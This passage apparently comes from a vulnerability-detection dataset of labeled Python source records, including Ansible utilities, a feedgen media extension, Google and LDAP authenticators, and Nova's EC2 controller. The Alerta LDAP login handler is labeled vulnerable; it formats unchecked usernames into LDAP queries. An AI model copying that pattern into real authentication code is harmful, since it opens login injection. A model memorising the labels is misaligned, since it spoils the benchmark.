do diff -U 10\n\n    try:\n        with warnings.catch_warnings():\n            warnings.simplefilter('ignore')\n            ret = []\n            if 'dst_binary' in diff:\n                ret.append(\"diff skipped: destination file appears to be binary\\n\")\n            if 'src_binary' in diff:\n                ret.append(\"diff skipped: source file appears to be binary\\n\")\n            if 'dst_larger' in diff:\n                ret.append(\"diff skipped: destination file size is greater than %d\\n\" % diff['dst_larger'])\n            if 'src_larger' in diff:\n                ret.append(\"diff skipped: source file size is greater than %d\\n\" % diff['src_larger'])\n            if 'before' in diff and 'after' in diff:\n                if 'before_header' in diff:\n                    before_header = \"before: %s\" % diff['before_header']\n                else:\n                    before_header = 'before'\n                if 'after_header' in diff:\n                    after_header = \"after: %s\" % diff['after_header']\n                else:\n                    after_header = 'after'\n                differ = difflib.unified_diff(to_unicode(diff['before']).splitlines(True), to_unicode(diff['after']).splitlines(True), before_header, after_header, '', '', 10)\n                for line in list(differ):\n                    ret.append(line)\n            return u\"\".join(ret)\n    except UnicodeDecodeError:\n        return \">> the files are different, but the diff library cannot compare unicode strings\"\n\ndef is_list_of_strings(items):\n    for x in items:\n        if not isinstance(x, basestring):\n            return False\n    return True\n\ndef list_union(a, b):\n    result = []\n    for x in a:\n        if x not in result:\n            result.append(x)\n    for x in b:\n        if x not in result:\n            result.append(x)\n    return result\n\ndef list_intersection(a, b):\n    result = []\n    for x in a:\n        if x in b and x not in result:\n            result.append(x)\n    return result\n\ndef safe_eval(expr, locals={}, include_exceptions=False):\n    '''\n    This is intended for allowing things like:\n    with_items: a_list_variable\n\n    Where Jinja2 would return a string but we do not want to allow it to\n    call functions (outside of Jinja2, where the env is constrained). If\n    the input data to this function came from an untrusted (remote) source,\n    it should first be run through _clean_data_struct() to ensure the data\n    is further sanitized prior to evaluation.\n\n    Based on:\n    http://stackoverflow.com/questions/12523516/using-ast-and-whitelists-to-make-pythons-eval-safe\n    '''\n\n    # this is the whitelist of AST nodes we are going to \n    # allow in the evaluation. Any node type other than \n    # those listed here will raise an exception in our custom\n    # visitor class defined below.\n    SAFE_NODES = set(\n        (\n            ast.Add,\n            ast.BinOp,\n            ast.Call,\n            ast.Compare,\n            ast.Dict,\n            ast.Div,\n            ast.Expression,\n            ast.List,\n            ast.Load,\n            ast.Mult,\n            ast.Num,\n            ast.Name,\n            ast.Str,\n            ast.Sub,\n            ast.Tuple,\n            ast.UnaryOp,\n        )\n    )\n\n    # AST node types were expanded after 2.6\n    if not sys.version.startswith('2.6'):\n        SAFE_NODES.union(\n            set(\n                (ast.Set,)\n            )\n        )\n\n    filter_list = []\n    for filter in filter_loader.all():\n        filter_list.extend(filter.filters().keys())\n\n    CALL_WHITELIST = C.DEFAULT_CALLABLE_WHITELIST + filter_list\n\n    class CleansingNodeVisitor(ast.NodeVisitor):\n        def generic_visit(self, node, inside_call=False):\n            if type(node) not in SAFE_NODES:\n                raise Exception(\"invalid expression (%s)\" % expr)\n            elif isinstance(node, ast.Call):\n                inside_call = True\n            elif isinstance(node, ast.Name) and inside_call:\n                if hasattr(builtin, node.id) and node.id not in CALL_WHITELIST:\n                    raise Exception(\"invalid function: %s\" % node.id)\n            # iterate over all child nodes\n            for child_node in ast.iter_child_nodes(node):\n                self.generic_visit(child_node, inside_call)\n\n    if not isinstance(expr, basestring):\n        # already templated to a datastructure, perhaps?\n        if include_exceptions:\n            return (expr, None)\n        return expr\n\n    cnv = CleansingNodeVisitor()\n    try:\n        parsed_tree = ast.parse(expr, mode='eval')\n        cnv.visit(parsed_tree)\n        compiled = compile(parsed_tree, expr, 'eval')\n        result = eval(compiled, {}, locals)\n\n        if include_exceptions:\n            return (result, None)\n        else:\n            return result\n    except SyntaxError, e:\n        # special handling for syntax errors, we just return\n        # the expression string back as-is\n        if include_exceptions:\n            return (expr, None)\n        return expr\n    except Exception, e:\n        if include_exceptions:\n            return (expr, e)\n        return expr\n\n\ndef listify_lookup_plugin_terms(terms, basedir, inject):\n\n    if isinstance(terms, basestring):\n        # someone did:\n        #    with_items: alist\n        # OR\n        #    with_items: {{ alist }}\n\n        stripped = terms.strip()\n        if not (stripped.startswith('{') or stripped.startswith('[')) and not stripped.startswith(\"/\") and not stripped.startswith('set(['):\n            # if not already a list, get ready to evaluate with Jinja2\n            # not sure why the \"/\" is in above code :)\n            try:\n                new_terms = template.template(basedir, \"{{ %s }}\" % terms, inject)\n                if isinstance(new_terms, basestring) and \"{{\" in new_terms:\n                    pass\n                else:\n                    terms = new_terms\n            except:\n                pass\n\n        if '{' in terms or '[' in terms:\n            # Jinja2 already evaluated a variable to a list.\n            # Jinja2-ified list needs to be converted back to a real type\n            # TODO: something a bit less heavy than eval\n            return safe_eval(terms)\n\n        if isinstance(terms, basestring):\n            terms = [ terms ]\n\n    return terms\n\ndef combine_vars(a, b):\n\n    if C.DEFAULT_HASH_BEHAVIOUR == \"merge\":\n        return merge_hash(a, b)\n    else:\n        return dict(a.items() + b.items())\n\ndef random_password(length=20, chars=C.DEFAULT_PASSWORD_CHARS):\n    '''Return a random password string of length containing only chars.'''\n\n    password = []\n    while len(password) < length:\n        new_char = os.urandom(1)\n        if new_char in chars:\n            password.append(new_char)\n\n    return ''.join(password)\n\ndef before_comment(msg):\n    ''' what's the part of a string before a comment? '''\n    msg = msg.replace(\"\\#\",\"**NOT_A_COMMENT**\")\n    msg = msg.split(\"#\")[0]\n    msg = msg.replace(\"**NOT_A_COMMENT**\",\"#\")\n    return msg\n\n\n\n", "target": 0}
{"idx": 1057, "func": "# -*- coding: utf-8 -*-\n'''\n    feedgen.ext.media\n    ~~~~~~~~~~~~~~~~~\n\n    Extends the feedgen to produce media tags.\n\n    :copyright: 2013-2017, Lars Kiesow <lkiesow@uos.de>\n\n    :license: FreeBSD and LGPL, see license.* for more details.\n'''\n\nfrom feedgen.ext.base import BaseEntryExtension, BaseExtension\nfrom feedgen.util import ensure_format, xml_elem\n\nMEDIA_NS = 'http://search.yahoo.com/mrss/'\n\n\nclass MediaExtension(BaseExtension):\n    '''FeedGenerator extension for torrent feeds.\n    '''\n\n    def extend_ns(self):\n        return {'media': MEDIA_NS}\n\n\nclass MediaEntryExtension(BaseEntryExtension):\n    '''FeedEntry extension for media tags.\n    '''\n\n    def __init__(self):\n        self.__media_content = []\n        self.__media_thumbnail = []\n\n    def extend_atom(self, entry):\n        '''Add additional fields to an RSS item.\n\n        :param feed: The RSS item XML element to use.\n        '''\n\n        groups = {None: entry}\n        for media_content in self.__media_content:\n            # Define current media:group\n            group = groups.get(media_content.get('group'))\n            if group is None:\n                group = xml_elem('{%s}group' % MEDIA_NS, entry)\n                groups[media_content.get('group')] = group\n            # Add content\n            content = xml_elem('{%s}content' % MEDIA_NS, group)\n            for attr in ('url', 'fileSize', 'type', 'medium', 'isDefault',\n                         'expression', 'bitrate', 'framerate', 'samplingrate',\n                         'channels', 'duration', 'height', 'width', 'lang'):\n                if media_content.get(attr):\n                    content.set(attr, media_content[attr])\n\n        for media_thumbnail in self.__media_thumbnail:\n            # Define current media:group\n            group = groups.get(media_thumbnail.get('group'))\n            if group is None:\n                group = xml_elem('{%s}group' % MEDIA_NS, entry)\n                groups[media_thumbnail.get('group')] = group\n            # Add thumbnails\n            thumbnail = xml_elem('{%s}thumbnail' % MEDIA_NS, group)\n            for attr in ('url', 'height', 'width', 'time'):\n                if media_thumbnail.get(attr):\n                    thumbnail.set(attr, media_thumbnail[attr])\n\n        return entry\n\n    def extend_rss(self, item):\n        return self.extend_atom(item)\n\n    def content(self, content=None, replace=False, group='default', **kwargs):\n        '''Get or set media:content data.\n\n        This method can be called with:\n        - the fields of a media:content as keyword arguments\n        - the fields of a media:content as a dictionary\n        - a list of dictionaries containing the media:content fields\n\n        <media:content> is a sub-element of either <item> or <media:group>.\n        Media objects that are not the same content should not be included in\n        the same <media:group> element. The sequence of these items implies\n        the order of presentation. While many of the attributes appear to be\n        audio/video specific, this element can be used to publish any type\n        of media. It contains 14 attributes, most of which are optional.\n\n        media:content has the following fields:\n        - *url* should specify the direct URL to the media object.\n        - *fileSize* number of bytes of the media object.\n        - *type* standard MIME type of the object.\n        - *medium* type of object (image | audio | video | document |\n          executable).\n        - *isDefault* determines if this is the default object.\n        - *expression* determines if the object is a sample or the full version\n          of the object, or even if it is a continuous stream (sample | full |\n          nonstop).\n        - *bitrate* kilobits per second rate of media.\n        - *framerate* number of frames per second for the media object.\n        - *samplingrate* number of samples per second taken to create the media\n          object. It is expressed in thousands of samples per second (kHz).\n        - *channels* number of audio channels in the media object.\n        - *duration* number of seconds the media object plays.\n        - *height* height of the media object.\n        - *width* width of the media object.\n        - *lang* is the primary language encapsulated in the media object.\n\n        :param content: Dictionary or list of dictionaries with content data.\n        :param replace: Add or replace old data.\n        :param group: Media group to put this content in.\n\n        :returns: The media content tag.\n        '''\n        # Handle kwargs\n        if content is None and kwargs:\n            content = kwargs\n        # Handle new data\n        if content is not None:\n            # Reset data if we want to replace them\n            if replace or self.__media_content is None:\n                self.__media_content = []\n            # Ensure list\n            if not isinstance(content, list):\n                content = [content]\n            # define media group\n            for c in content:\n                c['group'] = c.get('group', group)\n            self.__media_content += ensure_format(\n                    content,\n                    set(['url', 'fileSize', 'type', 'medium', 'isDefault',\n                         'expression', 'bitrate', 'framerate', 'samplingrate',\n                         'channels', 'duration', 'height', 'width', 'lang',\n                         'group']),\n                    set(['url', 'group']))\n        return self.__media_content\n\n    def thumbnail(self, thumbnail=None, replace=False, group='default',\n                  **kwargs):\n        '''Get or set media:thumbnail data.\n\n        This method can be called with:\n        - the fields of a media:content as keyword arguments\n        - the fields of a media:content as a dictionary\n        - a list of dictionaries containing the media:content fields\n\n        Allows particular images to be used as representative images for\n        the media object. If multiple thumbnails are included, and time\n        coding is not at play, it is assumed that the images are in order\n        of importance. It has one required attribute and three optional\n        attributes.\n\n        media:thumbnail has the following fields:\n        - *url* should specify the direct URL to the media object.\n        - *height* height of the media object.\n        - *width* width of the media object.\n        - *time* specifies the time offset in relation to the media object.\n\n        :param thumbnail: Dictionary or list of dictionaries with thumbnail\n                          data.\n        :param replace: Add or replace old data.\n        :param group: Media group to put this content in.\n\n        :returns: The media thumbnail tag.\n        '''\n        # Handle kwargs\n        if thumbnail is None and kwargs:\n            thumbnail = kwargs\n        # Handle new data\n        if thumbnail is not None:\n            # Reset data if we want to replace them\n            if replace or self.__media_thumbnail is None:\n                self.__media_thumbnail = []\n            # Ensure list\n            if not isinstance(thumbnail, list):\n                thumbnail = [thumbnail]\n            # Define media group\n            for t in thumbnail:\n                t['group'] = t.get('group', group)\n            self.__media_thumbnail += ensure_format(\n                    thumbnail,\n                    set(['url', 'height', 'width', 'time', 'group']),\n                    set(['url', 'group']))\n        return self.__media_thumbnail\n", "target": 0}
{"idx": 1058, "func": "import sys\n\nimport ldap  # pylint: disable=import-error\nfrom flask import current_app, jsonify, request\nfrom flask_cors import cross_origin\n\nfrom alerta.auth.utils import create_token, get_customers\nfrom alerta.exceptions import ApiError\nfrom alerta.models.permission import Permission\nfrom alerta.models.user import User\nfrom alerta.utils.audit import auth_audit_trail\n\nfrom . import auth\n\n\n@auth.route('/auth/login', methods=['OPTIONS', 'POST'])\n@cross_origin(supports_credentials=True)\ndef login():\n    # Allow LDAP server to use a self signed certificate\n    if current_app.config['LDAP_ALLOW_SELF_SIGNED_CERT']:\n        ldap.set_option(ldap.OPT_X_TLS_REQUIRE_CERT, ldap.OPT_X_TLS_ALLOW)\n\n    # Retrieve required fields from client request\n    try:\n        login = request.json.get('username', None) or request.json['email']\n        password = request.json['password']\n    except KeyError:\n        raise ApiError(\"must supply 'username' and 'password'\", 401)\n\n    try:\n        if '\\\\' in login:\n            domain, username = login.split('\\\\')\n            email = ''\n            email_verified = False\n        else:\n            username, domain = login.split('@')\n            email = login\n            email_verified = True\n    except ValueError:\n        raise ApiError('expected username with domain', 401)\n\n    # Validate LDAP domain\n    if domain not in current_app.config['LDAP_DOMAINS']:\n        raise ApiError('unauthorized domain', 403)\n\n    userdn = current_app.config['LDAP_DOMAINS'][domain] % username\n\n    # Attempt LDAP AUTH\n    try:\n        trace_level = 2 if current_app.debug else 0\n        ldap_connection = ldap.initialize(current_app.config['LDAP_URL'], trace_level=trace_level)\n        ldap_connection.simple_bind_s(userdn, password)\n    except ldap.INVALID_CREDENTIALS:\n        raise ApiError('invalid username or password', 401)\n    except Exception as e:\n        raise ApiError(str(e), 500)\n\n    # Get email address from LDAP\n    if not email_verified:\n        try:\n            ldap_result = ldap_connection.search_s(userdn, ldap.SCOPE_SUBTREE, '(objectClass=*)', ['mail'])\n            email = ldap_result[0][1]['mail'][0].decode(sys.stdout.encoding)\n            email_verified = True\n        except Exception:\n            email = '{}@{}'.format(username, domain)\n\n    # Create user if not yet there\n    user = User.find_by_username(username=login)\n    if not user:\n        user = User(name=username, login=login, password='', email=email,\n                    roles=[], text='LDAP user', email_verified=email_verified)\n        try:\n            user = user.create()\n        except Exception as e:\n            ApiError(str(e), 500)\n\n    # Assign customers & update last login time\n    groups = list()\n    try:\n        groups_filters = current_app.config.get('LDAP_DOMAINS_GROUP', {})\n        base_dns = current_app.config.get('LDAP_DOMAINS_BASEDN', {})\n        if domain in groups_filters and domain in base_dns:\n            resultID = ldap_connection.search(\n                base_dns[domain],\n                ldap.SCOPE_SUBTREE,\n                groups_filters[domain].format(username=username, email=email, userdn=userdn),\n                ['cn']\n            )\n            resultTypes, results = ldap_connection.result(resultID)\n            for _dn, attributes in results:\n                groups.append(attributes['cn'][0].decode('utf-8'))\n    except ldap.LDAPError as e:\n        raise ApiError(str(e), 500)\n\n    # Check user is active\n    if user.status != 'active':\n        raise ApiError('User {} not active'.format(login), 403)\n    user.update_last_login()\n\n    scopes = Permission.lookup(login=login, roles=user.roles + groups)\n    customers = get_customers(login=login, groups=[user.domain] + groups)\n\n    auth_audit_trail.send(current_app._get_current_object(), event='basic-ldap-login', message='user login via LDAP',\n                          user=login, customers=customers, scopes=scopes, roles=user.roles, groups=groups,\n                          resource_id=user.id, type='user', request=request)\n\n    # Generate token\n    token = create_token(user_id=user.id, name=user.name, login=user.email, provider='ldap',\n                         customers=customers, scopes=scopes, roles=user.roles, groups=groups,\n                         email=user.email, email_verified=user.email_verified)\n    return jsonify(token=token.tokenize)\n", "target": 1}
{"idx": 1059, "func": "\"\"\"\nCustom Authenticator to use Google OAuth with JupyterHub.\n\nDerived from the GitHub OAuth authenticator.\n\"\"\"\n\nimport os\nimport json\nimport urllib.parse\n\nfrom tornado import gen\nfrom tornado.httpclient import HTTPRequest, AsyncHTTPClient\nfrom tornado.auth import GoogleOAuth2Mixin\nfrom tornado.web import HTTPError\n\nfrom traitlets import Dict, Unicode, List, default, validate, observe\n\nfrom jupyterhub.crypto import decrypt, EncryptionUnavailable, InvalidToken\nfrom jupyterhub.auth import LocalAuthenticator\nfrom jupyterhub.utils import url_path_join\n\nfrom .oauth2 import OAuthLoginHandler, OAuthCallbackHandler, OAuthenticator\n\ndef check_user_in_groups(member_groups, allowed_groups):\n    # Check if user is a member of any group in the allowed groups\n    if any(g in member_groups for g in allowed_groups):\n        return True  # user _is_ in group\n    else:\n        return False\n\n\nclass GoogleOAuthenticator(OAuthenticator, GoogleOAuth2Mixin):\n    _deprecated_oauth_aliases = {\n        \"google_group_whitelist\": (\"allowed_google_groups\", \"0.12.0\"),\n        **OAuthenticator._deprecated_oauth_aliases,\n    }\n\n    google_api_url = Unicode(\"https://www.googleapis.com\", config=True)\n\n    @default('google_api_url')\n    def _google_api_url(self):\n        \"\"\"get default google apis url from env\"\"\"\n        google_api_url = os.getenv('GOOGLE_API_URL')\n\n        # default to googleapis.com\n        if not google_api_url:\n            google_api_url = 'https://www.googleapis.com'\n\n        return google_api_url\n\n    @default('scope')\n    def _scope_default(self):\n        return ['openid', 'email']\n\n    @default(\"authorize_url\")\n    def _authorize_url_default(self):\n        return \"https://accounts.google.com/o/oauth2/v2/auth\"\n\n    @default(\"token_url\")\n    def _token_url_default(self):\n        return \"%s/oauth2/v4/token\" % (self.google_api_url)\n\n    google_service_account_keys = Dict(\n        Unicode(),\n        help=\"Service account keys to use with each domain, see https://developers.google.com/admin-sdk/directory/v1/guides/delegation\"\n    ).tag(config=True)\n\n    gsuite_administrator = Dict(\n        Unicode(),\n        help=\"Username of a G Suite Administrator for the service account to act as\"\n    ).tag(config=True)\n\n    google_group_whitelist = Dict(help=\"Deprecated, use `GoogleOAuthenticator.allowed_google_groups`\", config=True,)\n\n    allowed_google_groups = Dict(\n        List(Unicode()),\n        help=\"Automatically allow members of selected groups\"\n    ).tag(config=True)\n\n    admin_google_groups = Dict(\n        List(Unicode()),\n        help=\"Groups whose members should have Jupyterhub admin privileges\"\n    ).tag(config=True)\n\n    user_info_url = Unicode(\n        \"https://www.googleapis.com/oauth2/v1/userinfo\", config=True\n    )\n\n    hosted_domain = List(\n        Unicode(),\n        config=True,\n        help=\"\"\"List of domains used to restrict sign-in, e.g. mycollege.edu\"\"\",\n    )\n\n    @default('hosted_domain')\n    def _hosted_domain_from_env(self):\n        domains = []\n        for domain in os.environ.get('HOSTED_DOMAIN', '').split(';'):\n            if domain:\n                # check falsy to avoid trailing separators\n                # adding empty domains\n                domains.append(domain)\n        return domains\n\n    @validate('hosted_domain')\n    def _cast_hosted_domain(self, proposal):\n        \"\"\"handle backward-compatibility with hosted_domain is a single domain as a string\"\"\"\n        if isinstance(proposal.value, str):\n            # pre-0.9 hosted_domain was a string\n            # set it to a single item list\n            # (or if it's empty, an empty list)\n            if proposal.value == '':\n                return []\n            return [proposal.value]\n        return proposal.value\n\n    login_service = Unicode(\n        os.environ.get('LOGIN_SERVICE', 'Google'),\n        config=True,\n        help=\"\"\"Google Apps hosted domain string, e.g. My College\"\"\",\n    )\n\n    async def authenticate(self, handler, data=None, google_groups=None):\n        code = handler.get_argument(\"code\")\n        body = urllib.parse.urlencode(\n            dict(\n                code=code,\n                redirect_uri=self.get_callback_url(handler),\n                client_id=self.client_id,\n                client_secret=self.client_secret,\n                grant_type=\"authorization_code\",\n            )\n        )\n\n        http_client = AsyncHTTPClient()\n\n        response = await http_client.fetch(\n            self.token_url,\n            method=\"POST\",\n            headers={\"Content-Type\": \"application/x-www-form-urlencoded\"},\n            body=body,\n        )\n\n        user = json.loads(response.body.decode(\"utf-8\", \"replace\"))\n        access_token = str(user['access_token'])\n        refresh_token = user.get('refresh_token', None)\n\n        response = await http_client.fetch(\n            self.user_info_url + '?access_token=' + access_token\n        )\n\n        if not response:\n            handler.clear_all_cookies()\n            raise HTTPError(500, 'Google authentication failed')\n\n        bodyjs = json.loads(response.body.decode())\n        user_email = username = bodyjs['email']\n        user_email_domain = user_email.split('@')[1]\n\n        if not bodyjs['verified_email']:\n            self.log.warning(\"Google OAuth unverified email attempt: %s\", user_email)\n            raise HTTPError(403, \"Google email {} not verified\".format(user_email))\n\n        if self.hosted_domain:\n            if user_email_domain not in self.hosted_domain:\n                self.log.warning(\n                    \"Google OAuth unauthorized domain attempt: %s\", user_email\n                )\n                raise HTTPError(\n                    403,\n                    \"Google account domain @{} not authorized.\".format(\n                        user_email_domain\n                    ),\n                )\n            if len(self.hosted_domain) == 1:\n                # unambiguous domain, use only base name\n                username = user_email.split('@')[0]\n\n        if refresh_token is None:\n            self.log.debug(\"Refresh token was empty, will try to pull refresh_token from previous auth_state\")\n            user = handler.find_user(username)\n\n            if user:\n                self.log.debug(\"encrypted_auth_state was found, will try to decrypt and pull refresh_token from it\")\n                try:\n                    encrypted = user.encrypted_auth_state\n                    auth_state = await decrypt(encrypted)\n                    refresh_token = auth_state.get('refresh_token')\n                except (ValueError, InvalidToken, EncryptionUnavailable) as e:\n                    self.log.warning(\n                        \"Failed to retrieve encrypted auth_state for %s because %s\",\n                        username,\n                        e,\n                    )\n\n        user_info = {\n            'name': username,\n            'auth_state': {\n                'access_token': access_token,\n                'refresh_token': refresh_token,\n                'google_user': bodyjs\n            }\n        }\n\n        if self.admin_google_groups or self.allowed_google_groups:\n            user_info = await self._add_google_groups_info(user_info, google_groups)\n\n        return user_info\n\n    def _service_client_credentials(self, scopes, user_email_domain):\n        \"\"\"\n        Return a configured service client credentials for the API.\n        \"\"\"\n        try:\n            from google.oauth2 import service_account\n        except:\n            raise ImportError(\n                \"Could not import google.oauth2's service_account,\"\n                \"you may need to run pip install oauthenticator[googlegroups] or not declare google groups\"\n            )\n\n        gsuite_administrator_email = \"{}@{}\".format(self.gsuite_administrator[user_email_domain], user_email_domain)\n        self.log.debug(\"scopes are %s, user_email_domain is %s\", scopes, user_email_domain)\n        credentials = service_account.Credentials.from_service_account_file(\n            self.google_service_account_keys[user_email_domain],\n            scopes=scopes\n        )\n\n        credentials = credentials.with_subject(gsuite_administrator_email)\n\n        return credentials\n\n    def _service_client(self, service_name, service_version, credentials, http=None):\n        \"\"\"\n        Return a configured service client for the API.\n        \"\"\"\n        try:\n            from googleapiclient.discovery import build\n        except:\n            raise ImportError(\n                \"Could not import googleapiclient.discovery's build,\"\n                \"you may need to run pip install oauthenticator[googlegroups] or not declare google groups\"\n            )\n\n        self.log.debug(\"service_name is %s, service_version is %s\", service_name, service_version)\n\n        return build(\n            serviceName=service_name,\n            version=service_version,\n            credentials=credentials,\n            cache_discovery=False,\n            http=http)\n\n    async def _google_groups_for_user(self, user_email, credentials, http=None):\n        \"\"\"\n        Return google groups a given user is a member of\n        \"\"\"\n        service = self._service_client(\n            service_name='admin',\n            service_version='directory_v1',\n            credentials=credentials,\n            http=http)\n\n        results = service.groups().list(userKey=user_email).execute()\n        results = [ g['email'].split('@')[0] for g in results.get('groups', [{'email': None}]) ]\n        self.log.debug(\"user_email %s is a member of %s\", user_email, results)\n        return results\n\n    async def _add_google_groups_info(self, user_info, google_groups=None):\n        user_email_domain=user_info['auth_state']['google_user']['hd']\n        user_email=user_info['auth_state']['google_user']['email']\n        if google_groups is None:\n            credentials = self._service_client_credentials(\n                    scopes=['%s/auth/admin.directory.group.readonly' % (self.google_api_url)],\n                    user_email_domain=user_email_domain)\n            google_groups = await self._google_groups_for_user(\n                    user_email=user_email,\n                    credentials=credentials)\n        user_info['auth_state']['google_user']['google_groups'] = google_groups\n\n        # Check if user is a member of any admin groups.\n        if self.admin_google_groups:\n            is_admin = check_user_in_groups(google_groups, self.admin_google_groups[user_email_domain])\n        # Check if user is a member of any allowed groups.\n        user_in_group = check_user_in_groups(google_groups, self.allowed_google_groups[user_email_domain])\n\n        if self.admin_google_groups and (is_admin or user_in_group):\n            user_info['admin'] = is_admin\n            return user_info\n        elif user_in_group:\n            return user_info\n        else:\n            return None\n\n\nclass LocalGoogleOAuthenticator(LocalAuthenticator, GoogleOAuthenticator):\n    \"\"\"A version that mixes in local system user creation\"\"\"\n\n    pass\n", "target": 0}
{"idx": 1060, "func": "# vim: tabstop=4 shiftwidth=4 softtabstop=4\n\n# Copyright 2010 United States Government as represented by the\n# Administrator of the National Aeronautics and Space Administration.\n# All Rights Reserved.\n#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n#    a copy of the License at\n#\n#         http://www.apache.org/licenses/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n#    distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n#    License for the specific language governing permissions and limitations\n#    under the License.\n\n\"\"\"\nCloud Controller: Implementation of EC2 REST API calls, which are\ndispatched to other nodes via AMQP RPC. State is via distributed\ndatastore.\n\"\"\"\n\nimport base64\nimport os\nimport re\nimport shutil\nimport tempfile\nimport time\nimport urllib\n\nfrom nova import block_device\nfrom nova import compute\nfrom nova import context\n\nfrom nova import crypto\nfrom nova import db\nfrom nova import exception\nfrom nova import flags\nfrom nova import ipv6\nfrom nova import log as logging\nfrom nova import network\nfrom nova import rpc\nfrom nova import utils\nfrom nova import volume\nfrom nova.api.ec2 import ec2utils\nfrom nova.compute import instance_types\nfrom nova.compute import vm_states\nfrom nova.image import s3\n\n\nFLAGS = flags.FLAGS\nflags.DECLARE('dhcp_domain', 'nova.network.manager')\nflags.DECLARE('service_down_time', 'nova.scheduler.driver')\n\nLOG = logging.getLogger(\"nova.api.cloud\")\n\n\ndef _gen_key(context, user_id, key_name):\n    \"\"\"Generate a key\n\n    This is a module level method because it is slow and we need to defer\n    it into a process pool.\"\"\"\n    # NOTE(vish): generating key pair is slow so check for legal\n    #             creation before creating key_pair\n    try:\n        db.key_pair_get(context, user_id, key_name)\n        raise exception.KeyPairExists(key_name=key_name)\n    except exception.NotFound:\n        pass\n    private_key, public_key, fingerprint = crypto.generate_key_pair()\n    key = {}\n    key['user_id'] = user_id\n    key['name'] = key_name\n    key['public_key'] = public_key\n    key['fingerprint'] = fingerprint\n    db.key_pair_create(context, key)\n    return {'private_key': private_key, 'fingerprint': fingerprint}\n\n\n# EC2 API can return the following values as documented in the EC2 API\n# http://docs.amazonwebservices.com/AWSEC2/latest/APIReference/\n#    ApiReference-ItemType-InstanceStateType.html\n# pending | running | shutting-down | terminated | stopping | stopped\n_STATE_DESCRIPTION_MAP = {\n    None: 'pending',\n    vm_states.ACTIVE: 'running',\n    vm_states.BUILDING: 'pending',\n    vm_states.REBUILDING: 'pending',\n    vm_states.DELETED: 'terminated',\n    vm_states.STOPPED: 'stopped',\n    vm_states.MIGRATING: 'migrate',\n    vm_states.RESIZING: 'resize',\n    vm_states.PAUSED: 'pause',\n    vm_states.SUSPENDED: 'suspend',\n    vm_states.RESCUED: 'rescue',\n}\n\n\ndef state_description_from_vm_state(vm_state):\n    \"\"\"Map the vm state to the server status string\"\"\"\n    return _STATE_DESCRIPTION_MAP.get(vm_state, vm_state)\n\n\n# TODO(yamahata): hypervisor dependent default device name\n_DEFAULT_ROOT_DEVICE_NAME = '/dev/sda1'\n_DEFAULT_MAPPINGS = {'ami': 'sda1',\n                     'ephemeral0': 'sda2',\n                     'root': _DEFAULT_ROOT_DEVICE_NAME,\n                     'swap': 'sda3'}\n\n\ndef _parse_block_device_mapping(bdm):\n    \"\"\"Parse BlockDeviceMappingItemType into flat hash\n    BlockDevicedMapping.<N>.DeviceName\n    BlockDevicedMapping.<N>.Ebs.SnapshotId\n    BlockDevicedMapping.<N>.Ebs.VolumeSize\n    BlockDevicedMapping.<N>.Ebs.DeleteOnTermination\n    BlockDevicedMapping.<N>.Ebs.NoDevice\n    BlockDevicedMapping.<N>.VirtualName\n    => remove .Ebs and allow volume id in SnapshotId\n    \"\"\"\n    ebs = bdm.pop('ebs', None)\n    if ebs:\n        ec2_id = ebs.pop('snapshot_id', None)\n        if ec2_id:\n            id = ec2utils.ec2_id_to_id(ec2_id)\n            if ec2_id.startswith('snap-'):\n                bdm['snapshot_id'] = id\n            elif ec2_id.startswith('vol-'):\n                bdm['volume_id'] = id\n            ebs.setdefault('delete_on_termination', True)\n        bdm.update(ebs)\n    return bdm\n\n\ndef _properties_get_mappings(properties):\n    return block_device.mappings_prepend_dev(properties.get('mappings', []))\n\n\ndef _format_block_device_mapping(bdm):\n    \"\"\"Contruct BlockDeviceMappingItemType\n    {'device_name': '...', 'snapshot_id': , ...}\n    => BlockDeviceMappingItemType\n    \"\"\"\n    keys = (('deviceName', 'device_name'),\n             ('virtualName', 'virtual_name'))\n    item = {}\n    for name, k in keys:\n        if k in bdm:\n            item[name] = bdm[k]\n    if bdm.get('no_device'):\n        item['noDevice'] = True\n    if ('snapshot_id' in bdm) or ('volume_id' in bdm):\n        ebs_keys = (('snapshotId', 'snapshot_id'),\n                    ('snapshotId', 'volume_id'),        # snapshotId is abused\n                    ('volumeSize', 'volume_size'),\n                    ('deleteOnTermination', 'delete_on_termination'))\n        ebs = {}\n        for name, k in ebs_keys:\n            if k in bdm:\n                if k == 'snapshot_id':\n                    ebs[name] = ec2utils.id_to_ec2_snap_id(bdm[k])\n                elif k == 'volume_id':\n                    ebs[name] = ec2utils.id_to_ec2_vol_id(bdm[k])\n                else:\n                    ebs[name] = bdm[k]\n        assert 'snapshotId' in ebs\n        item['ebs'] = ebs\n    return item\n\n\ndef _format_mappings(properties, result):\n    \"\"\"Format multiple BlockDeviceMappingItemType\"\"\"\n    mappings = [{'virtualName': m['virtual'], 'deviceName': m['device']}\n                for m in _properties_get_mappings(properties)\n                if block_device.is_swap_or_ephemeral(m['virtual'])]\n\n    block_device_mapping = [_format_block_device_mapping(bdm) for bdm in\n                            properties.get('block_device_mapping', [])]\n\n    # NOTE(yamahata): overwrite mappings with block_device_mapping\n    for bdm in block_device_mapping:\n        for i in range(len(mappings)):\n            if bdm['deviceName'] == mappings[i]['deviceName']:\n                del mappings[i]\n                break\n        mappings.append(bdm)\n\n    # NOTE(yamahata): trim ebs.no_device == true. Is this necessary?\n    mappings = [bdm for bdm in mappings if not (bdm.get('noDevice', False))]\n\n    if mappings:\n        result['blockDeviceMapping'] = mappings\n\n\nclass CloudController(object):\n    \"\"\" CloudController provides the critical dispatch between\n inbound API calls through the endpoint and messages\n sent to the other nodes.\n\"\"\"\n    def __init__(self):\n        self.image_service = s3.S3ImageService()\n        self.network_api = network.API()\n        self.volume_api = volume.API()\n        self.compute_api = compute.API(\n                network_api=self.network_api,\n                volume_api=self.volume_api)\n        self.setup()\n\n    def __str__(self):\n        return 'CloudController'\n\n    def setup(self):\n        \"\"\" Ensure the keychains and folders exist. \"\"\"\n        # FIXME(ja): this should be moved to a nova-manage command,\n        # if not setup throw exceptions instead of running\n        # Create keys folder, if it doesn't exist\n        if not os.path.exists(FLAGS.keys_path):\n            os.makedirs(FLAGS.keys_path)\n        # Gen root CA, if we don't have one\n        root_ca_path = os.path.join(FLAGS.ca_path, FLAGS.ca_file)\n        if not os.path.exists(root_ca_path):\n            